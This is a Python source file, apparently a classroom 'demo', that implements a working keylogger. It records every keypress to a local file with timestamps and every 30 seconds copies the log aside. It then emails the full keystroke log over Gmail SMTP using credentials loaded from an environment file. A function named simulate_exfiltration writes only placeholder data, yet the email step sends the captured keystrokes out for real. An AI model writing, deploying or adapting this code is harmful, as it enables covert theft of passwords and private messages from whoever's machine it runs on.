from pynput.keyboard import Listener
import smtplib
import time
import os
import json
import shutil
from datetime import datetime
from email.message import EmailMessage
from dotenv import load_dotenv

load_dotenv()

EMAIL_FROM = os.getenv("EMAIL_FROM")
PASSWORD = os.getenv("PASSWORD")
EMAIL_TO = os.getenv("EMAIL_TO")

LOG_FILE = "keylog_demo.txt"
OUTBOX_DIR = "outbox"

event_count = 0

def anonymous(key):
    global event_count
    key_str = str(key).replace("'", "")
    
    if key_str == 'Key.esc':
        raise SystemExit(0)
    elif key_str == 'Key.enter':
        key_str = 'ENTER'
    elif key_str == 'Key.backspace':
        key_str = 'BACKSPACE'
    elif key_str == 'Key.space':
        key_str = 'SPACE'
    elif key_str.startswith('Key.'):
        key_str = key_str.replace("Key.", "").upper()
    
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_line = f"[{timestamp}] {key_str}\n"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_line)
    print(f"[{timestamp}] {key_str}")
    event_count += 1

def simulate_exfiltration(count):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] Preparing log for transmission")
    print(f"[{timestamp}] Destination: SIMULATED_SERVER")
    print(f"[{timestamp}] {count} events would be transmitted")
    
    os.makedirs(OUTBOX_DIR, exist_ok=True)
    simulated_data = {
        "student_id": "SV001",
        "event_count": count,
        "payload": "SIMULATED_DATA"
    }
    time_tag = datetime.now().strftime("%Y%m%d_%H%M%S")
    with open(f"{OUTBOX_DIR}/simulated_{time_tag}.json", "w") as f:
        json.dump(simulated_data, f, indent=4)


def send_email_report():
    if not os.path.exists(LOG_FILE):
        return
    msg = EmailMessage()
    msg['Subject'] = 'Log File'
    msg['From'] = EMAIL_FROM
    msg['To'] = EMAIL_TO
    with open(LOG_FILE, "rb") as file:
        content = file.read()
    msg.add_attachment(content, maintype="text", subtype="plain", filename=LOG_FILE)
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_FROM, PASSWORD)
            smtp.send_message(msg)
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")


print(f"[{datetime.now().strftime('%H:%M:%S')}] Collecting keyboard events")
listener = Listener(on_press=anonymous)
listener.start()
try:
    while True:
        time.sleep(30)
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"\n[{timestamp}] Đã đến thời điểm xử lý log")
        
        os.makedirs(OUTBOX_DIR, exist_ok=True)
        if os.path.exists(LOG_FILE):
            time_tag = datetime.now().strftime("%Y%m%d_%H%M%S")
            shutil.copy(LOG_FILE, f"{OUTBOX_DIR}/keylog_{time_tag}.txt")
        
        simulate_exfiltration(event_count)
        event_count = 0
        
        send_email_report()
except KeyboardInterrupt:
    print("\nProgram stopped.")